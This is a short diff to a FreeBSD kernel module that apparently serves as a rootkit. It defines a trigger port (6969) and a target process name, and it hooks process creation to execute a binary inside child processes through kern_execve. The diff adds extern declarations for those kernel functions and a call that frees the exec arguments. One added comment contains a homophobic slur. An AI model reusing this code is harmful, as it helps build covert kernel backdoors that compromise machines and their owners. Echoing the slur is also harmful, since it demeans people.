@@ -27,6 +27,12 @@
 #include <sys/unistd.h> // for RFPROC
 #include <sys/imgact.h> // For image_args
 
+// since BSD is gay as hell and doesn't provide headers for these we declare them as external
+extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
+    struct vmspace *oldvmspace);
+
+extern int exec_copyin_args(struct image_args *args, const char *fname,
+    enum uio_seg segflg, char **argv, char **envv);
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
 #define TARGET_PROC "apeshit"
@@ -77,6 +83,8 @@ static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int
 
     // Execute the binary inside the child process
     error = kern_execve(child_td, &args, NULL, child->p_vmspace);
+    // free args
+    exec_free_args(&args);
     if (error) {
         printf("[LKM] kern_execve failed for: %d\n", error);
     } else {
